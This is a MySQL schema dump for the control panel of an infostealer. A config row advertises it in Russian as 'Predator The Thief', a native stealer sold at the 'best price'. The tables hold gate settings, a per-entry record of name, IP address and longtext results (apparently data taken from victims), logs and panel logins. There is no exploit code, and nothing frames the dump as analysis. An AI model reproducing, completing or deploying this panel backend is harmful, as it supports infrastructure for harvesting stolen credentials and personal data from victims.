CREATE TABLE `category` (
  `id` int(11) NOT NULL,
  `name` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `config` (
  `id` int(11) NOT NULL,
  `argument` varchar(255) DEFAULT NULL,
  `body` longtext
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO `config` VALUES 
(1,'gate_time','1'),
(2,'gate_count','10'),
(3,'title','Predator The Thief — Нативный стиллер с большим функционалом / Лучшая цена!'),
(4,'theme','skin-black'),
(5,'login_icon',''),
(6,'icon',''),
(7,'theme_grad','nogradient');

CREATE TABLE `history` (
  `id` int(11) NOT NULL,
  `timeout` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `text` text CHARACTER SET utf8mb4,
  `timeout` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `manager` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `ip` varchar(255) DEFAULT NULL,
  `result` longtext,
  `category` int(11) NOT NULL DEFAULT '0',
  `user_id` int(11) NOT NULL DEFAULT '0',
  `view` int(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `login` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

ALTER TABLE `category`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `config`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `history`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `manager`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `config`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

ALTER TABLE `history`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `manager`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;
COMMIT;